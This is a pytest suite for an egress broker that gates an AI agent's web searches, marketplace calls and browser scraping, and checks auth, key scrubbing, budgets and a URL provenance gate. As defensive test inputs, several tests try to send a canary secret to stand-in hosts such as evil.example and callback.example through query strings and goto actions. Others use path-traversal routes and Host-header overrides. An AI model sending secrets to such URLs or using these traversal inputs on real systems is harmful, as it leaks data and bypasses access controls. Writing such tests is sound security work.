"""Hermetic tests for the egress broker (docs/egress-broker.md §8.1).

No external calls: keyed APIs go through a fake transport, the scraper is a
local HTTP stub on 127.0.0.1 that records every request.
"""
from __future__ import annotations

import http.server
import json
import os
import socket
import threading
import time
import urllib.parse
from pathlib import Path

import pytest

from broker import config, marketplaces, scraper_proxy, server, trademark
from broker.runs import Registry
from scraper import urlpolicy

RUN_A = "a" * 32
RUN_B = "b" * 32
# Fake credentials: recognisable, low entropy (gitleaks stays quiet).
CREDS = {name: f"FAKE-{name}-KEY" for name in config.CREDENTIAL_NAMES}
CANARY = "canary" + "0a1b2c3d" * 4


# --- fakes ---------------------------------------------------------------------

class FakeTransport:
    """Records upstream calls; answers by URL prefix."""

    def __init__(self):
        self.calls: list[dict] = []
        self.answers: dict[str, tuple[int, object]] = {}

    def __call__(self, method, url, headers, body, timeout, impersonate):
        self.calls.append({"method": method, "url": url, "headers": dict(headers),
                           "body": body, "timeout": timeout})
        for prefix, (status, payload) in sorted(self.answers.items(), key=lambda kv: -len(kv[0])):
            if url.startswith(prefix):
                data = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
                return status, data
        return 404, b"{}"


class FakeScraper(http.server.ThreadingHTTPServer):
    """Scraper stub: records (path, body); replies from self.replies[path]."""

    def __init__(self):
        self.requests: list[tuple[str, dict]] = []
        self.replies: dict[str, tuple[int, dict]] = {}
        stub = self

        class H(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get("Content-Length", "0"))
                body = json.loads(self.rfile.read(n) or b"{}")
                stub.requests.append((self.path, body, self.headers.get("Authorization")))
                key = self.path
                if key.startswith("/session/") and key != "/session/open":
                    key = "/session/" + key.rsplit("/", 1)[-1]
                status, reply = stub.replies.get(key, (200, {"status": "ok"}))
                data = json.dumps(reply).encode()
                self.send_response(status)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *a):
                pass

        super().__init__(("127.0.0.1", 0), H)
        threading.Thread(target=self.serve_forever, kwargs={"poll_interval": 0.02},
                         daemon=True).start()


@pytest.fixture
def env(tmp_path):
    marketplaces.EBAY_TOKEN.clear()
    trademark.EUIPO_TOKEN.clear()
    tok = tmp_path / "scraper-token"
    tok.write_text("scraper-bearer-for-tests\n")
    fake = FakeScraper()
    transport = FakeTransport()
    app = server.Broker(dict(CREDS), transport=transport,
                        scraper=scraper_proxy.Scraper(f"http://127.0.0.1:{fake.server_port}",
                                                      str(tok)),
                        registry=Registry(), state_dir=str(tmp_path), sleep=lambda s: None)

    class Env:
        pass

    e = Env()
    e.app, e.transport, e.scraper, e.tmp = app, transport, fake, tmp_path

    def register(run_id=RUN_A, depth="normal", prompt_urls=()):
        status, body = app.handle_admin("POST", "/admin/runs", {
            "run_id": run_id, "depth": depth, "provider": "claude",
            "prompt_urls": list(prompt_urls), "ttl_s": 600})
        assert status == 200, body
        return body["token"]

    def vm(token, path, body=None, method="POST"):
        status, reply, _run, _reason = app.handle_vm(method, path, f"Bearer {token}",
                                                     {} if body is None else body)
        return status, reply

    e.register, e.vm = register, vm
    yield e
    fake.shutdown()


def _page(final, links=(), text="", html="", **extra):
    return (200, dict({"status": "ok", "requested_url": final, "final_url": final,
                       "http_status": 200, "title": "t", "html": html, "text": text,
                       "links": list(links)}, **extra))


# --- auth -------------------------------------------------------------------------

def test_auth_missing_unknown_expired_revoked(env):
    tok = env.register()
    assert env.app.handle_vm("POST", "/v1/exa/search", "", {"query": "x"})[0] == 401
    assert env.vm("not-a-token", "/v1/exa/search", {"query": "x"})[0] == 401
    run = env.app.registry.lookup(tok)
    run.expires = time.time() - 1
    assert env.vm(tok, "/v1/exa/search", {"query": "x"})[0] == 401
    tok2 = env.register(RUN_B)
    env.app.handle_admin("DELETE", f"/admin/runs/{RUN_B}", {})
    status, reply = env.vm(tok2, "/v1/exa/search", {"query": "x"})
    assert status == 401 and "run not registered" in reply["error"]


def test_register_is_admin_only(env):
    status, _ = env.vm("x", "/admin/runs", {"run_id": RUN_A}, method="POST")
    assert status == 404
    assert env.app.handle_vm("GET", "/v1/health", "", {})[0] == 200


@pytest.mark.parametrize("body", [
    {"run_id": "nothex", "depth": "normal", "ttl_s": 1},
    {"run_id": RUN_A, "depth": "fast", "ttl_s": 1},
    {"run_id": RUN_A, "depth": "normal", "ttl_s": 0},
    {"run_id": RUN_A, "depth": "normal", "ttl_s": 1, "prompt_urls": "x"},
    {"run_id": RUN_A, "depth": "normal", "ttl_s": 1, "provider": "other"},
])
def test_register_validates(env, body):
    assert env.app.handle_admin("POST", "/admin/runs", body)[0] == 400


def test_token_is_256_bit_and_unique(env):
    a, b = env.register(), env.register()
    assert a != b and len(a) >= 43


def test_other_runs_session_is_403_and_save_artifact_uses_token_run(env):
    ta, tb = env.register(RUN_A), env.register(RUN_B)
    env.scraper.replies["/session/open"] = (200, {"status": "ok", "session_id": "ab" * 8,
                                                  "final_url": "https://x.example/",
                                                  "snapshot": "", "links": []})
    assert env.vm(ta, "/v1/scraper/session/open", {"url": "https://x.example/"})[0] == 403
    # Prompt URL makes it fetchable.
    ta = env.register(RUN_A, prompt_urls=["https://x.example/"])
    assert env.vm(ta, "/v1/scraper/session/open", {"url": "https://x.example/"})[0] == 200
    sid = "ab" * 8
    status, reply = env.vm(tb, f"/v1/scraper/session/{sid}/act",
                           {"actions": [{"type": "click", "target": {"ref": "e1"}}]})
    assert status == 403 and "another run" in reply["error"]
    assert env.vm(tb, f"/v1/scraper/session/{'cd' * 8}/close", {})[0] == 404
    env.scraper.requests.clear()
    status, _ = env.vm(ta, f"/v1/scraper/session/{sid}/save_artifact",
                       {"name": "shot", "run_id": RUN_B})
    assert status == 200
    path, body, _auth = env.scraper.requests[-1]
    assert path.endswith("/save_artifact") and body["run_id"] == RUN_A


@pytest.mark.parametrize("path", [
    "/v1/scraper/session/../../admin/x", "/v1/scraper/session/ABCD/act",
    "/v1/scraper/session/abababababababab/delete", "/v1/exa/../tavily/search",
    "/v1/scraper/session/abababababababab/act/x",
])
def test_path_traversal_is_404(env, path):
    tok = env.register()
    assert env.vm(tok, path, {})[0] == 404


# --- keys never leak ------------------------------------------------------------------

def _all_routes(env, tok):
    t = env.transport
    t.answers.update({
        "https://api.exa.ai/search": (200, {"results": [{"url": "https://r.example/1",
                                                         "title": "x", "text": "y"}]}),
        "https://api.tavily.com/search": (200, {"answer": "a", "results": []}),
        marketplaces.EBAY_TOKEN_URL: (200, {"access_token": "ebay-access-tok",
                                            "refresh_token": "ebay-refresh-tok",
                                            "expires_in": 7200}),
        marketplaces.EBAY_SEARCH_URL: (200, {"total": 0, "itemSummaries": []}),
        marketplaces.TRADERA_SEARCH_URL: (200, {"items": [], "totalNumberOfItems": 0}),
        trademark.AUTH_URL: (200, {"access_token": "euipo-access-tok", "expires_in": 600}),
        trademark.SEARCH_URL: (200, {"trademarks": []}),
    })
    out = []
    out.append(env.vm(tok, "/v1/exa/search", {"query": "kettle"}))
    out.append(env.vm(tok, "/v1/tavily/search", {"query": "kettle"}))
    out.append(env.vm(tok, "/v1/ebay/search", {"query": "kettle"}))
    out.append(env.vm(tok, "/v1/tradera/search", {"query": "vattenkokare"}))
    out.append(env.vm(tok, "/v1/euipo/search", {"name": "acme"}))
    return out


def test_keys_never_in_responses_or_logs(env, capsys):
    tok = env.register()
    replies = _all_routes(env, tok)
    assert all(s == 200 for s, _ in replies), replies
    # Error paths too: upstream echoes the key in its error body.
    env.transport.answers["https://api.exa.ai/search"] = (
        400, ("bad key " + CREDS["exa-api-key"]).encode())
    env.transport.answers[marketplaces.EBAY_SEARCH_URL] = (
        500, ("echo " + CREDS["ebay-client-secret"] + " ebay-access-tok").encode())
    replies += [env.vm(tok, "/v1/exa/search", {"query": "x"}),
                env.vm(tok, "/v1/ebay/search", {"query": "x"})]
    # Through the real HTTP writer (scrub happens there).
    blob = "".join(env.app.scrub(json.dumps(r)) for _, r in replies)
    blob += capsys.readouterr().err
    for name, value in CREDS.items():
        assert value not in blob, name
    for tok_value in ("ebay-access-tok", "euipo-access-tok", "ebay-refresh-tok"):
        assert tok_value not in blob


def test_keys_only_in_the_expected_header(env):
    tok = env.register()
    _all_routes(env, tok)
    seen = {}
    for c in env.transport.calls:
        hay = json.dumps(c["headers"]) + (c["body"] or b"").decode("latin-1") + c["url"]
        auth = c["headers"].get("Authorization", "")
        if auth.startswith("Basic "):
            import base64
            hay += base64.b64decode(auth[6:]).decode()
        for name, value in CREDS.items():
            if value in hay:
                seen.setdefault(name, set()).add(urllib.parse.urlsplit(c["url"]).path)
    assert seen["exa-api-key"] == {"/search"} and seen["tavily-api-key"] == {"/search"}
    assert seen["ebay-client-id"] == {"/identity/v1/oauth2/token"}
    assert seen["euipo-client-secret"] == {"/oidc/accessToken"}
    exa = next(c for c in env.transport.calls if "api.exa.ai" in c["url"])
    assert exa["headers"]["x-api-key"] == CREDS["exa-api-key"]
    assert CREDS["exa-api-key"] not in (exa["body"] or b"").decode()
    trad = next(c for c in env.transport.calls if "api.tradera.com" in c["url"])
    assert trad["headers"]["X-App-Key"] == CREDS["tradera-app-key"]


def test_unconfigured_api_is_503_and_sends_nothing(env):
    env.app.creds["tavily-api-key"] = ""
    env.app.creds["ebay-client-secret"] = ""
    tok = env.register()
    assert env.vm(tok, "/v1/tavily/search", {"query": "x"})[0] == 503
    status, reply = env.vm(tok, "/v1/ebay/search", {"query": "x"})
    assert status == 503 and "not configured" in reply["error"]
    assert env.transport.calls == []


# --- route invariants -----------------------------------------------------------------

FIXED_HOSTS = {"api.exa.ai", "api.tavily.com", "api.ebay.com", "api.tradera.com",
               "auth-sandbox.euipo.europa.eu", "api-sandbox.euipo.europa.eu"}


def test_no_request_field_changes_host_path_or_method(env):
    tok = env.register()
    _all_routes(env, tok)
    hostile = {"url": "https://evil.example/x", "host": "evil.example", "method": "DELETE",
               "path": "/../../admin", "marketplace": "EBAY_DE",
               "query": "kettle", "name": "acme", "headers": {"Host": "evil.example"}}
    for route in server.KEYED_ROUTES:
        env.vm(tok, route, dict(hostile))
    for c in env.transport.calls:
        parts = urllib.parse.urlsplit(c["url"])
        assert parts.scheme == "https" and parts.hostname in FIXED_HOSTS, c["url"]
        assert c["method"] in ("GET", "POST")
        assert "evil" not in json.dumps(c["headers"])


def test_upstream_urls_are_code_constants():
    for mod, names in ((marketplaces, ("EBAY_TOKEN_URL", "EBAY_SEARCH_URL", "TRADERA_SEARCH_URL")),
                       (trademark, ("AUTH_URL", "SEARCH_URL"))):
        for name in names:
            assert urllib.parse.urlsplit(getattr(mod, name)).hostname in FIXED_HOSTS
    from broker import search
    assert {urllib.parse.urlsplit(u).hostname for u in (search.EXA_URL, search.TAVILY_URL)} \
        <= FIXED_HOSTS
    assert not hasattr(config, "EXA_URL")


# --- OAuth -----------------------------------------------------------------------------

def test_oauth_token_minted_once_and_cached(env):
    tok = env.register()
    _all_routes(env, tok)
    for _ in range(3):
        assert env.vm(tok, "/v1/ebay/search", {"query": "x"})[0] == 200
    mints = [c for c in env.transport.calls if c["url"] == marketplaces.EBAY_TOKEN_URL]
    assert len(mints) == 1
    assert marketplaces.EBAY_TOKEN.exp > time.time() + 7000
    assert not hasattr(marketplaces.EBAY_TOKEN, "refresh_token")


def test_oauth_cold_route_fits_inside_the_shim_timeout():
    # Fix 7: mint + search share one deadline below the shim's read timeout.
    assert config.OAUTH_MINT_TIMEOUT_S + 1 < config.KEYED_ROUTE_DEADLINE_S
    assert config.KEYED_ROUTE_DEADLINE_S + 5 <= config.SHIM_KEYED_TIMEOUT_S


def test_route_deadline_bounds_the_upstream_timeout(env):
    tok = env.register()
    _all_routes(env, tok)
    env.vm(tok, "/v1/ebay/search", {"query": "x"})
    for c in env.transport.calls:
        assert c["timeout"] <= config.KEYED_UPSTREAM_TIMEOUT_S
    mint = next(c for c in env.transport.calls if c["url"] == marketplaces.EBAY_TOKEN_URL)
    assert mint["timeout"] <= config.OAUTH_MINT_TIMEOUT_S


# --- marketplace etiquette ---------------------------------------------------------

def test_marketplace_budget_and_refusal_close(env):
    tok = env.register()
    _all_routes(env, tok)
    for _ in range(config.ROUTE_BUDGETS["tradera"]["normal"] - 1):
        assert env.vm(tok, "/v1/tradera/search", {"query": "x"})[0] == 200
    status, reply = env.vm(tok, "/v1/tradera/search", {"query": "x"})
    assert status == 429 and "budget" in reply["error"]
    env.transport.answers[marketplaces.EBAY_SEARCH_URL] = (429, b"slow down")
    assert env.vm(tok, "/v1/ebay/search", {"query": "x"})[0] == 502
    n = len(env.transport.calls)
    status, reply = env.vm(tok, "/v1/ebay/search", {"query": "x"})
    assert status == 429 and "no further requests" in reply["error"]
    assert len(env.transport.calls) == n


def test_ebay_canonical_urls_are_ledgered(env):
    tok = env.register()
    _all_routes(env, tok)
    fixture = json.loads((Path(__file__).parent / "fixtures" / "ebay_item_summary_de.json").read_text())
    env.transport.answers[marketplaces.EBAY_SEARCH_URL] = (200, fixture)
    status, reply = env.vm(tok, "/v1/ebay/search", {"query": "x"})
    assert status == 200
    urls = [it["url"] for it in reply["itemSummaries"]]
    assert urls and all(u.startswith("https://www.ebay.") and "/itm/" in u for u in urls)
    assert all("itemWebUrl" not in it for it in reply["itemSummaries"])
    run = env.app.registry.lookup(tok)
    assert all(run.check(u).allowed for u in urls)


# --- ledger feed --------------------------------------------------------------------------

def test_search_results_feed_the_ledger_but_not_tavily_answer(env):
    tok = env.register()
    env.transport.answers["https://api.exa.ai/search"] = (200, {"results": [
        {"url": "https://r.example/a", "text": "see https://inner.example/p"}]})
    env.transport.answers["https://api.tavily.com/search"] = (200, {
        "answer": "go to https://answer.example/x",
        "results": [{"url": "https://t.example/b", "content": "c https://tc.example/q"}]})
    env.vm(tok, "/v1/exa/search", {"query": "x"})
    env.vm(tok, "/v1/tavily/search", {"query": "x"})
    run = env.app.registry.lookup(tok)
    for u in ("https://r.example/a", "https://inner.example/p", "https://t.example/b",
              "https://tc.example/q"):
        assert run.check(u).allowed, u
    assert not run.check("https://answer.example/x").allowed


def test_render_feeds_final_url_links_and_text_not_requested_url(env):
    tok = env.register(prompt_urls=["https://start.example/"])
    env.scraper.replies["/render"] = _page(
        "https://start.example/landing", links=["https://out.example/1"],
        text="read https://text.example/2", html='<a href="/rel/x">x</a>')
    env.scraper.replies["/render"][1]["requested_url"] = "https://requested.example/?k=1"
    status, reply = env.vm(tok, "/v1/scraper/render", {"url": "https://start.example/"})
    assert status == 200 and "links" not in reply
    run = env.app.registry.lookup(tok)
    for u in ("https://start.example/landing", "https://out.example/1",
              "https://text.example/2", "https://start.example/rel/x"):
        assert run.check(u).allowed, u
    assert not run.check("https://requested.example/?k=1").allowed


def test_clas_ohlson_json_render_ledgers_the_joined_item_url(env):
    search_url = "https://www.clasohlson.com/se/search/getSearchResults?text=vattenkokare"
    tok = env.register()
    body = (Path(__file__).parent / "fixtures" / "clasohlson_getSearchResults.json").read_text()
    env.scraper.replies["/render"] = _page(search_url, text=body)
    assert env.vm(tok, "/v1/scraper/render", {"url": search_url})[0] == 200
    item = "https://www.clasohlson.com/se/Vattenkokare-i-plast,-1,7-liter/p/44-4973"
    assert env.vm(tok, "/v1/scraper/render", {"url": item})[0] == 200


def test_typed_text_is_never_harvested(env):
    tok = env.register(prompt_urls=["https://shop.example/"])
    env.scraper.replies["/session/open"] = (200, {"status": "ok", "session_id": "ab" * 8,
                                                  "final_url": "https://shop.example/",
                                                  "snapshot": "", "links": []})
    env.vm(tok, "/v1/scraper/session/open", {"url": "https://shop.example/"})
    env.scraper.replies["/session/act"] = (200, {"status": "ok", "final_url": "https://shop.example/",
                                                 "snapshot": "", "links": []})
    env.vm(tok, f"/v1/scraper/session/{'ab' * 8}/act", {"actions": [
        {"type": "fill", "target": {"ref": "e1"}, "text": "typed.example words"}]})
    run = env.app.registry.lookup(tok)
    assert not any("typed.example" in u for u in run.ledger.urls)


# --- the gate ----------------------------------------------------------------------------

def test_unseen_url_refused_with_the_model_facing_text(env):
    tok = env.register()
    status, reply = env.vm(tok, "/v1/scraper/render", {"url": f"https://evil.example/?k={CANARY}"})
    assert status == 403
    assert reply["error"].startswith("render_page refused by the provenance gate")
    assert "never build one" in reply["error"] and "URL: https://evil.example/" in reply["error"]
    assert env.scraper.requests == []


def test_template_allowed_and_abuse_refused(env):
    tok = env.register()
    env.scraper.replies["/render"] = _page("https://www.ikea.com/se/sv/search/?q=soffbord")
    assert env.vm(tok, "/v1/scraper/render",
                  {"url": "https://www.ikea.com/se/sv/search/?q=soffbord"})[0] == 200
    for q in ("https://callback.example/?k=" + CANARY, CANARY):
        url = "https://www.ikea.com/se/sv/search/?q=" + urllib.parse.quote(q)
        assert env.vm(tok, "/v1/scraper/render", {"url": url})[0] == 403


def test_goto_inside_act_is_gated_before_anything_is_sent(env):
    tok = env.register(prompt_urls=["https://shop.example/"])
    env.scraper.replies["/session/open"] = (200, {"status": "ok", "session_id": "ab" * 8,
                                                  "final_url": "https://shop.example/",
                                                  "snapshot": "", "links": []})
    env.vm(tok, "/v1/scraper/session/open", {"url": "https://shop.example/"})
    env.scraper.requests.clear()
    status, reply = env.vm(tok, f"/v1/scraper/session/{'ab' * 8}/act", {"actions": [
        {"type": "click", "target": {"ref": "e1"}},
        {"type": "goto", "url": f"https://evil.example/?k={CANARY}"}]})
    assert status == 403 and "browse_act goto refused" in reply["error"]
    assert env.scraper.requests == []


def test_search_query_url_refused_and_bare_domain_allowed(env):
    tok = env.register()
    env.transport.answers["https://api.exa.ai/search"] = (200, {"results": []})
    env.transport.answers["https://api.tavily.com/search"] = (200, {"results": []})
    for route in ("/v1/exa/search", "/v1/tavily/search"):
        status, reply = env.vm(tok, route, {"query": f"callback.example/s?k={CANARY}"})
        assert status == 400 and reply["error"] == urlpolicy.SEARCH_QUERY_REFUSAL
        assert env.vm(tok, route, {"query": "vattenkokare ikea.se"})[0] == 200
    assert all("callback" not in (c["body"] or b"").decode() for c in env.transport.calls)


def _open(env, tok, viewport=None):
    env.scraper.replies["/session/open"] = (200, {"status": "ok", "session_id": "ab" * 8,
                                                  "final_url": "https://shop.example/",
                                                  "snapshot": "", "links": []})
    env.scraper.replies["/session/act"] = (200, {"status": "ok", "final_url": "https://shop.example/",
                                                 "snapshot": "", "links": []})
    body = {"url": "https://shop.example/"}
    if viewport is not None:
        body["viewport"] = viewport
    assert env.vm(tok, "/v1/scraper/session/open", body)[0] == 200
    return f"/v1/scraper/session/{'ab' * 8}"


def test_typed_text_per_call_rule_per_run_budget_and_press_grammar(env):
    tok = env.register(prompt_urls=["https://shop.example/"])
    s = _open(env, tok)
    fill = {"type": "fill", "target": {"ref": "e1"}}
    status, reply = env.vm(tok, s + "/act", {"actions": [dict(fill, text=CANARY[:24])]})
    assert status == 400 and "opaque" in reply["error"]
    status, reply = env.vm(tok, s + "/act", {"actions": [
        {"type": "press", "target": {"ref": "e1"}, "key": "Enter Enter"}]})
    assert status == 400 and "key name" in reply["error"]
    budget = config.TYPED_CHARS["normal"]
    sent = 0
    while True:
        status, reply = env.vm(tok, s + "/act", {"actions": [dict(fill, text="ord " * 20)]})
        if status != 200:
            break
        sent += 80
    assert status == 429 and "typed-text budget" in reply["error"]
    assert sent <= budget
    # Char-by-char through press counts too.
    run = env.app.registry.lookup(tok)
    left = budget - run.typed_chars
    presses = [{"type": "press", "target": {"ref": "e1"}, "key": "a"}] * (left + 1)
    assert env.vm(tok, s + "/act", {"actions": presses[:20]})[0] in (200, 429)


def test_numbers_are_snapped_before_forwarding(env):
    tok = env.register(prompt_urls=["https://shop.example/"])
    s = _open(env, tok, viewport={"width": 1000, "height": 999})
    open_body = next(b for p, b, _ in env.scraper.requests if p == "/session/open")
    assert open_body["viewport"] == {"width": 1280, "height": 800}
    assert open_body["run_id"] == RUN_A and "https://shop.example/" in open_body["nav_policy"]["urls"]
    env.vm(tok, s + "/act", {"actions": [
        {"type": "click", "target": {"x": 101.37, "y": 55.51}},
        {"type": "scroll", "dy": 50},
        {"type": "wait_ms", "ms": 1234},
        {"type": "drag", "from": {"x": 3.3, "y": 900}, "to": {"ref": "e2"},
         "steps": 33, "hold_ms": 777}]})
    _p, body, _a = env.scraper.requests[-1]
    assert body["actions"] == [
        {"type": "click", "target": {"x": 104, "y": 56}},
        {"type": "scroll", "dy": 100},
        {"type": "wait_ms", "ms": 1000},
        {"type": "drag", "from": {"x": 0, "y": 792}, "to": {"ref": "e2"}, "steps": 20,
         "hold_ms": 1000}]
    assert body["run_id"] == RUN_A


def test_browser_action_budget_counts_actions_opens_and_screenshots(env):
    tok = env.register(prompt_urls=["https://shop.example/"])
    s = _open(env, tok)
    run = env.app.registry.lookup(tok)
    assert run.browser_actions == 1
    env.vm(tok, s + "/act", {"actions": [{"type": "wait_ms", "ms": 250}] * 3})
    assert run.browser_actions == 4
    env.vm(tok, s + "/screenshot", {})
    assert run.browser_actions == 5
    run.browser_actions = config.BROWSER_ACTIONS["normal"]
    status, reply = env.vm(tok, s + "/screenshot", {})
    assert status == 429 and "browser-action budget" in reply["error"]


def test_raw_xy_and_drag_caps_point_at_refs(env):
    tok = env.register(prompt_urls=["https://shop.example/"])
    s = _open(env, tok)
    click = {"type": "click", "target": {"x": 10, "y": 10}}
    for _ in range(config.MAX_XY_TARGETS_PER_RUN // 10):
        assert env.vm(tok, s + "/act", {"actions": [click] * 10})[0] == 200
    status, reply = env.vm(tok, s + "/act", {"actions": [click]})
    assert status == 429 and "ref:'eN'" in reply["error"]
    assert env.vm(tok, s + "/act", {"actions": [
        {"type": "click", "target": {"ref": "e3"}}]})[0] == 200
    run = env.app.registry.lookup(tok)
    run.drags = config.MAX_DRAGS_PER_RUN
    status, reply = env.vm(tok, s + "/act", {"actions": [
        {"type": "drag", "from": {"ref": "e1"}, "to": {"ref": "e2"}}]})
    assert status == 429 and "drag budget" in reply["error"]


def test_route_budget_exhaustion_is_429(env):
    tok = env.register()
    env.transport.answers["https://api.exa.ai/search"] = (200, {"results": []})
    for _ in range(config.ROUTE_BUDGETS["exa"]["normal"]):
        assert env.vm(tok, "/v1/exa/search", {"query": "x"})[0] == 200
    status, reply = env.vm(tok, "/v1/exa/search", {"query": "x"})
    assert status == 429 and "exa budget for this run exhausted" in reply["error"]


def test_intercept_gated_snapped_and_ledgers_captures(env):
    tok = env.register(prompt_urls=["https://spa.example/"])
    env.scraper.replies["/intercept"] = (200, {
        "status": "ok", "requested_url": "https://spa.example/", "final_url": "https://spa.example/",
        "captured": [{"request": {"url": "https://spa.example/api?q=a", "body": ""},
                      "response": {"url": "https://spa.example/api?q=a",
                                   "body": '{"u": "https://hit.example/1"}'}}],
        "links": []})
    status, _ = env.vm(tok, "/v1/scraper/intercept", {
        "url": "https://spa.example/", "capture_patterns": ["/api"],
        "actions": [{"type": "fill", "selector": "#q", "text": "acme"},
                    {"type": "wait_for_timeout_ms", "ms": 1234}]})
    assert status == 200
    _p, body, auth = env.scraper.requests[-1]
    assert auth == "Bearer scraper-bearer-for-tests"
    assert body["actions"][1]["ms"] == 1000 and body["nav_policy"]["templates"] is True
    run = env.app.registry.lookup(tok)
    assert run.check("https://hit.example/1").allowed
    assert run.typed_chars == 4 and run.browser_actions == 2


def test_scraper_down_is_502(env):
    tok = env.register(prompt_urls=["https://x.example/"])
    env.app.scraper.base = "http://127.0.0.1:9"
    status, reply = env.vm(tok, "/v1/scraper/render", {"url": "https://x.example/"})
    assert status == 502 and reply["error"] == "scraper unavailable"


# --- lifecycle: state, reload, deregistration ----------------------------------------

def test_state_survives_a_restart(env):
    tok = env.register(prompt_urls=["https://keep.example/"])
    run = env.app.registry.lookup(tok)
    run.typed_chars = 42
    run.sessions["ab" * 8] = {"width": 1280, "height": 800}
    env.app.save_state()
    assert oct(os.stat(env.tmp / server.STATE_FILE).st_mode & 0o777) == "0o600"
    fresh = server.Broker(dict(CREDS), transport=env.transport, scraper=env.app.scraper,
                          registry=Registry(), state_dir=str(env.tmp))
    fresh.load_state()
    again = fresh.registry.lookup(tok)
    assert again is not None and again.typed_chars == 42
    assert again.check("https://keep.example/").allowed and "ab" * 8 in again.sessions
    assert not (env.tmp / server.STATE_FILE).exists()


def test_idle_code_change_restarts_busy_one_does_not(env, tmp_path):
    root = tmp_path / "code"
    (root / "broker").mkdir(parents=True)
    (root / "scraper").mkdir()
    (root / "broker" / "x.py").write_text("a = 1\n")
    (root / "scraper" / "urlpolicy.py").write_text("")
    app = server.Broker(dict(CREDS), transport=env.transport, registry=Registry(),
                        code_root=str(root))
    reg = {"run_id": RUN_A, "depth": "normal", "ttl_s": 60}
    assert app.handle_admin("POST", "/admin/runs", reg)[0] == 200
    (root / "broker" / "x.py").write_text("a = 2\n")
    # A run is active: keep serving on the loaded code.
    assert app.handle_admin("POST", "/admin/runs", dict(reg, run_id=RUN_B))[0] == 200
    assert not app.exit_requested.is_set()
    app.deregister(RUN_A)
    app.deregister(RUN_B)
    status, reply = app.handle_admin("POST", "/admin/runs", reg)
    assert status == 503 and reply["error"] == "restarting" and app.exit_requested.is_set()


def test_deregister_closes_sessions_and_summarises(env, capsys):
    tok = env.register(prompt_urls=["https://shop.example/"])
    _open(env, tok)
    status, reply = env.app.handle_admin("DELETE", f"/admin/runs/{RUN_A}", {})
    assert status == 200 and reply["summaries"][0]["browser_actions"] == 1
    path, body, _ = env.scraper.requests[-1]
    assert path.endswith("/close") and body == {"run_id": RUN_A}
    assert "run summary" in capsys.readouterr().err


def test_ttl_sweep_deregisters(env):
    tok = env.register()
    env.app.registry.lookup(tok).expires = time.time() - 1
    env.app.sweep()
    assert env.app.registry.active() == 0


# --- sockets: real listeners, unix admin + TCP vm ---------------------------------------

def test_real_listeners_over_tcp_and_unix(env, tmp_path):
    vm = socket.create_server(("127.0.0.1", 0))
    admin_path = str(tmp_path / "admin.sock")
    admin = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    admin.bind(admin_path)
    admin.listen(4)
    servers = [server.make_server(vm, server.VMHandler, env.app),
               server.make_server(admin, server.AdminHandler, env.app)]
    for s in servers:
        threading.Thread(target=s.serve_forever, daemon=True).start()
    try:
        import http.client

        class UnixConn(http.client.HTTPConnection):
            def connect(self):
                self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                self.sock.connect(admin_path)

        c = UnixConn("localhost")
        c.request("POST", "/admin/runs", json.dumps(
            {"run_id": RUN_A, "depth": "normal", "ttl_s": 60}),
            {"Content-Type": "application/json"})
        token = json.loads(c.getresponse().read())["token"]
        env.transport.answers["https://api.exa.ai/search"] = (200, {"results": []})
        t = http.client.HTTPConnection("127.0.0.1", vm.getsockname()[1], timeout=10)
        t.request("POST", "/v1/exa/search", json.dumps({"query": "x"}),
                  {"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
        r = t.getresponse()
        assert r.status == 200 and json.loads(r.read())["status"] == "ok"
        t.request("POST", "/admin/runs", "{}", {"Content-Type": "application/json"})
        r = t.getresponse()
        assert r.status == 404
        r.read()
    finally:
        for s in servers:
            s.shutdown()
            s.server_close()
